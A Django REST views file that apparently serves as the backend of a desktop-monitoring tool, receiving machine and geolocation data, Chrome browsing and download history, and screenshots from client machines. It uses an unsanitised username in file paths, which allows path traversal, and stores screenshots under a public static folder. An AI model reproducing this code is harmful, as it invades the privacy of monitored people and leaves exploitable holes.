import os
from uuid import uuid4
from datetime import datetime
from django.core.files.storage import default_storage
from django.core.files.base import ContentFile
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated
from rest_framework.parsers import MultiPartParser, FormParser
from rest_framework.response import Response
from rest_framework import status
from rest_framework.views import APIView
from remoteDesktops.models import Desktop, Screenshot, ChromeUrlHistory, ChromeDownloadLog


def get_client_ip(request):
    """Retrieve the real public IP address of the user."""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]  # Get the first IP in the list
    else:
        ip = request.META.get('REMOTE_ADDR')  # Fallback to direct IP
    return ip

@api_view(['POST'])
@permission_classes([IsAuthenticated])
def receive_data(request):
    """Receives data from Machine."""
    try :
        data = request.data
        data['geo_location']['ip_address'] = get_client_ip(request)
        Desktop.objects.record_machine(data)
    except Exception as error:
        print("error: ", error)
        return Response({"error": str(error)}, status=400)
    return Response({"message": "Machine data received successfully"}, status=status.HTTP_200_OK)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def receive_chrome_data(request):
    try:
        data = request.data
        ChromeUrlHistory.objects.record(user=data['username'], machine=data['guid'], urlHistories=data['chromeHistory'])
        ChromeDownloadLog.objects.record(user=data['username'], machine=data['guid'], downloads=data['chromeDownloads']
    )
    except Exception as error:
        return Response({"error": str(error)}, status=400)
    return Response({"message": "User data received successfully"}, status=status.HTTP_200_OK)

@permission_classes([IsAuthenticated])
class FileUploadView(APIView):
    parser_classes = (MultiPartParser, FormParser)

    @staticmethod
    def generate_filename(name):
        file_extension = os.path.splitext(name)[1]
        return f"{uuid4().hex}{file_extension}"

    def post(self, request, *args, **kwargs):
        try:
            file = request.FILES.get('file')
            if file:
                username = request.POST.get('username')
                guid = request.POST.get('guid')

                today = datetime.today().strftime("%Y-%m-%d")
                save_path = os.path.join("static/assets/images", username, today)
                file_path = os.path.join(save_path, self.generate_filename(file.name))
                file_name = default_storage.save(file_path, ContentFile(file.read()))

                return Response(Screenshot.objects.save_image(username, guid, file_name), status=status.HTTP_200_OK)
            return Response({"error": "No file uploaded"}, status=400)
        except Exception as error:
            return Response({"error": str(error)}, status=400)
